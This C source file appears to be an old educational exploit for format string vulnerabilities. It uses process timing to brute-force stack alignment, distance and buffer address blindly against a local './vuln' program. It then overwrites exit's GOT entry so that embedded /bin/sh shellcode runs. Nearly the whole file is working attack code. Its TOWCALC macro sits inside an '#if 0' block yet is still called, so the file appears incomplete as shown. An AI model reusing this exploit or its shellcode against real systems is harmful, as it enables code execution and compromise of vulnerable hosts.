/* format string exploitation
 *
 * example: brute forcing align, distance and format string address, without
 *          seeing the response (using response times).
 *
 * ideas by: tf8 (align, distance) and scut (address)
 *
 * expects a vulnerable program on "./vuln" that takes a format string as
 * first parameter, eg ./vuln foo%%bar.
 */


#include <sys/types.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include "fmtxp.h"

/* TFACT is the factor, if you have a laggy network or slow computer,
 * experiment here :-)
 */
#define	TFACT		16

/* leave this unchanged (except for porting to some other system)
 */
#define	BITS_PER_POP	32
#define	DISTANCE_MAX	1024
#define	ADDRESS_VALID	0xbffffd20
#define	ADDRESS_INVALID	0x50505050

/* where to search for the format string
 */
#define	ADDRESS_LOW	0xbfff7d10
#define	ADDRESS_HIGH	0xbffffff0


/* fear this
 */
#if 0
#define	TOWCALC(rabyte,written) ( \
	(((rabyte + 0x100) - (written % 0x100)) % 0x100) < 10 ? \
		((((rabyte + 0x100) - (written % 0x100)) % 0x100) + 0x100) : \
		(((rabyte + 0x100) - (written % 0x100)) % 0x100) \
	)
#endif

unsigned long int	fail_time,
			succ_time;

void	xp_commit (int align, int distance, unsigned long int bufaddr,
	unsigned long int retloc);
int	is_longdelay (int align, int distance,
	unsigned long int address, char wr_c);
int	contains_fmtchars (unsigned char *ckbuf, unsigned long int len);
void	pad_to (unsigned char *buf, int tsize);
int	dist_is_valid (int align, int distance, unsigned long int address);
unsigned long int	fmt_time (unsigned char *fmtbuf, int dopad);
unsigned long int	tv_diff (struct timeval *tv_a, struct timeval *tv_b);

int
main (int argc, char *argv[])
{
	unsigned long int	exit_addr;
	unsigned long int	taddr;
	int			align,
				distance;


	/* should succeed */
	succ_time = fmt_time ("%.997350u", 0);

	/* should crash on any possible stack layout */
	fail_time = fmt_time ("%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n", 0);
	printf ("test timing, (%lu) success, (%lu) failure.\n",
		succ_time, fail_time);

	/* now we are going to test for the address of the format
	 * string itself
	 */
	{
		unsigned long int	tneed;

		tneed = fail_time * (BITS_PER_POP / 8);
		tneed /= 1000000 / 1024;

		printf ("attempting to find align and distance, "
			"will need %lu seconds max...\n", tneed);
	}


	/* unpredictability margin
	 */
	fail_time *= TFACT;

	for (align = 0 ; align <= ((BITS_PER_POP / 8) - 1) ; ++align) {
		for (distance = 0 ; distance < 1024 ; ++distance) {
			if (dist_is_valid (align, distance,
				ADDRESS_VALID) != 0 &&
				dist_is_valid (align, distance,
				ADDRESS_INVALID) == 0)
			{
				printf ("success.\nalign = %d\n"
					"distance = %d\n", align, distance);
				sleep (1);
				goto atest;
			}
		}
	}

	printf ("failed to find align + distance.\n");
	exit (EXIT_FAILURE);

atest:
	/* now we are going to test for the address of the format
	 * string itself
	 */
	{
		unsigned long int	tneed;

		tneed = (ADDRESS_HIGH - ADDRESS_LOW) * fail_time;
		tneed /= 1000000;

		printf ("attempting to find address, will need %lu seconds "
			"max...\n", tneed);
	}

	for (taddr = ADDRESS_HIGH ; taddr > ADDRESS_LOW ; taddr -= 1) {
		printf ("\raddr = 0x%08lx     ", taddr);
		fflush (stdout);

		if (is_longdelay (align, distance, taddr, 'd') == 1 &&
			is_longdelay (align, distance, taddr, '\x00') == 0)
		{
			printf ("\n");
			printf ("hit at 0x%08lx\n", taddr);
			taddr = taddr - align - (distance * strlen ("%08x")) -
				strlen ("%123u%n%.997350");
			printf ("buffer at 0x%08lx\n", taddr);

			goto doxp;
		}
	}

	printf ("\n");
	printf ("failed to find format string address.\n");

	exit (EXIT_FAILURE);

doxp:
	exit_addr = xp_got_retrieve ("./vuln", "exit");
	if (exit_addr == 0) {
		printf ("failed to get GOT address for exit\n");
		exit (EXIT_FAILURE);
	}

	printf ("GOT address of exit: 0x%08lx\n", exit_addr);
	xp_commit (align, distance, taddr, exit_addr);

	exit (EXIT_SUCCESS);
}


void
xp_commit (int align, int distance, unsigned long int bufaddr,
	unsigned long int retloc)
{
	unsigned char	fmtbuf[512];

	/* old one by k2 */
	unsigned char *	shellcode =
		"\xeb\x1d\x5e\x29\xc0\x88\x46\x07\x89\x46\x0c\x89"
		"\x76\x08\xb0\x0b\x87\xf3\x8d\x4b\x08\x8d\x53\x0c"
		"\xcd\x80\x29\xc0\x40\xcd\x80\xe8\xde\xff\xff\xff"
		"/bin/sh";

	memcpy (fmtbuf, shellcode, strlen (shellcode));
	xp_fmt_simple (align + (distance * 4) + strlen (shellcode),
		retloc,
		bufaddr,
		strlen (shellcode),
		fmtbuf + strlen (shellcode),
		sizeof (fmtbuf) - strlen (shellcode) - 1);

	printf ("%s\n", fmtbuf);
	pad_to (fmtbuf, 200);
	execl ("./vuln", "vuln", fmtbuf, NULL);

	return;
}


int
is_longdelay (int align, int distance, unsigned long int address, char wr_c)
{
	int			tow;
	unsigned long int	timing;
	unsigned long int	wrcount = 0;
	unsigned char		addstr[4];
	unsigned char		fmtbuf[4096];

	memset (fmtbuf, '\x00', sizeof (fmtbuf));
	while (align > 0) {
		strcat (fmtbuf, "X");
		align -= 1;
		wrcount += 1;
	}
	addstr[0] = address & 0xff;
	addstr[1] = (address >> 8) & 0xff;
	addstr[2] = (address >> 16) & 0xff;
	addstr[3] = (address >> 24) & 0xff;
	memcpy (fmtbuf + strlen (fmtbuf), addstr, sizeof (addstr));
	wrcount += 4;

	/* skip those that would cause trouble
	 */
	if (contains_fmtchars (fmtbuf, wrcount))
		return (-1);

	distance -= 1;	/* needed for dummy padding */
	while (distance > 0) {
		strcat (fmtbuf, "%08x");
		distance -= 1;
		wrcount += 8;
	}

	tow = TOWCALC (wr_c, wrcount);
	sprintf (fmtbuf + strlen (fmtbuf), "%%%03du%%n", tow);
	strcat (fmtbuf, "%.997350");

	/* the byte directly behind the '0' is the one we want to hit and to
	 * store 'd' there, so that we cause a delay :-)
	 */

	timing = fmt_time (fmtbuf, 1);
	if (timing > fail_time)
		return (1);

	return (0);
}


int
contains_fmtchars (unsigned char *ckbuf, unsigned long int len)
{
	while (len > 0) {
		if (*ckbuf == '%' || *ckbuf == '\x00')
			return (1);
		ckbuf += 1;

		len -= 1;
	}

	return (0);
}


int
dist_is_valid (int align, int distance, unsigned long int address)
{
	unsigned long int	timing;
	unsigned char		addstr[4];
	unsigned char		fmtbuf[4096];

	memset (fmtbuf, '\x00', sizeof (fmtbuf));
	while (align > 0) {
		strcat (fmtbuf, "X");
		align -= 1;
	}

	addstr[0] = address & 0xff;
	addstr[1] = (address >> 8) & 0xff;
	addstr[2] = (address >> 16) & 0xff;
	addstr[3] = (address >> 24) & 0xff;
	memcpy (fmtbuf + strlen (fmtbuf), addstr, sizeof (addstr));

	while (distance > 0) {
		strcat (fmtbuf, "%08x");
		distance -= 1;
	}

	strcat (fmtbuf, "%n");
	strcat (fmtbuf, "%.997350u");

	/* now the buffer is perfectly constructed, check what it does :)
	 */
	timing = fmt_time (fmtbuf, 1);
	if (timing > fail_time)
		return (1);

	return (0);
}


unsigned long int
fmt_time (unsigned char *fmtbuf, int dopad)
{
	int		status = 0;
	pid_t		cpid;
	struct timeval	tv_start,
			tv_end;

	gettimeofday (&tv_start, NULL);
	cpid = fork ();
	if (cpid == -1) {
		perror ("fork");
		exit (EXIT_FAILURE);
	}

	if (cpid == 0) {
		if (dopad)
			pad_to (fmtbuf, 200);
		execl ("./vuln", "vuln", fmtbuf, NULL);
	}

	wait (&status);
	gettimeofday (&tv_end, NULL);

	return (tv_diff (&tv_end, &tv_start));
}


void
pad_to (unsigned char *buf, int tsize)
{
	int	mcount;

	for (mcount = strlen (buf) ; mcount < tsize ; ++mcount)
		strcat (buf, "_");

	return;
}


/* w00! what a mess */
unsigned long int
tv_diff (struct timeval *tv_a, struct timeval *tv_b)
{
	unsigned long int	diff;

	if (tv_a->tv_sec < tv_b->tv_sec ||
		(tv_a->tv_sec == tv_b->tv_sec && tv_a->tv_sec < tv_b->tv_sec))
	{
		struct timeval *	tvtmp;

		tvtmp = tv_b;
		tv_b = tv_a;
		tv_a = tvtmp;
	}

	diff = (tv_a->tv_sec - tv_b->tv_sec) * 1000000;
	if (tv_a->tv_sec == tv_b->tv_sec) {
		diff += tv_a->tv_usec - tv_b->tv_usec;
	} else {
		if (tv_a->tv_usec >= tv_b->tv_usec)
			diff += tv_a->tv_usec - tv_b->tv_usec;
		else
			diff -= tv_b->tv_usec - tv_a->tv_usec;
	}

	return (diff);
}


